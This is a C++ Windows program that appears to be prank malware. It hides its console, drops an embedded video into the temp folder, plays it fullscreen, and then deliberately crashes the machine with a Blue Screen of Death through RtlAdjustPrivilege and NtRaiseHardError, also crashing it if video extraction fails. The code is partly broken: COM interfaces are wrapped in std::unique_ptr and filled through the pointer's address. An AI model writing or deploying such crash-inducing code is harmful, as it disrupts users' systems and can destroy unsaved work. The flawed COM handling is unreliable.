#include <windows.h>
#include <dshow.h>
#include <memory>

// externs for BSoD stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// smart pointers for DirectShow interfaces
std::unique_ptr<IGraphBuilder> graph;
std::unique_ptr<IMediaControl> control;
std::unique_ptr<IMediaEvent> event;
std::unique_ptr<IVideoWindow> window;

// functions
void TriggerBSOD() {
    // initialize variables
    BOOLEAN state;
    ULONG response;

    // adjust privileges and raise a BSoD
    RtlAdjustPrivilege(19, TRUE, FALSE, &state);
    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response);
}

int GetVideoResource(LPWSTR* path) {
    // get the video resource handle
    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);

    // get resource data
    DWORD size = SizeofResource(NULL, resource);
    LPVOID data = LockResource(LoadResource(NULL, resource));

    if (data == NULL) {
        return 1; // return if the resource data is null
    }

    // create a temporary file path
    *path = new WCHAR[MAX_PATH];

    GetTempPathW(MAX_PATH, *path);
    StringCbCatW(*path, MAX_PATH, L"video.wmv");

    // create and write resource data to the temporary file
    HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;

    if (file == INVALID_HANDLE_VALUE) {
        return 1; // return if the file handle is invalid
    }

    if (!WriteFile(file, data, size, &written, NULL) || written != size) {
        return 1; // return if the file write fails
    }

    // close the file handle and free the resource
    CloseHandle(file);
    FreeResource(resource);

    // do the required return
    return 0;
}

void InitializeDirectShow(LPCWSTR path) {
    // initialize the COM library
    CoInitialize(NULL);

    // create DirectShow objects
    graph.reset();
    control.reset();
    event.reset();
    window.reset();

    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

    graph->QueryInterface(IID_IMediaControl, (void**)&control);
    graph->QueryInterface(IID_IMediaEvent, (void**)&event);
    graph->QueryInterface(IID_IVideoWindow, (void**)&window);

    // render the video file
    graph->RenderFile(path, NULL);

    // set DirectShow to full screen mode
    window->put_FullScreenMode(OATRUE);
}

// main stuff
int main() {
    // initialize variables
    LPWSTR path;
    
    HRESULT result;
	LONG code;

    // hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // get the video resource
    if (GetVideoResource(&path) == 1) {
        TriggerBSOD(); // trigger a BSoD if getting the video fails
    }

    // initialize DirectShow
    InitializeDirectShow(path);

    // play the video
    result = control->Run();

    // wait for the video to finish playing
	if (SUCCEEDED(result)) {
		event->WaitForCompletion(INFINITE, &code);
	}

    // trigger a BSoD
    TriggerBSOD();

    // return 1 in case of failure
    return 1;
}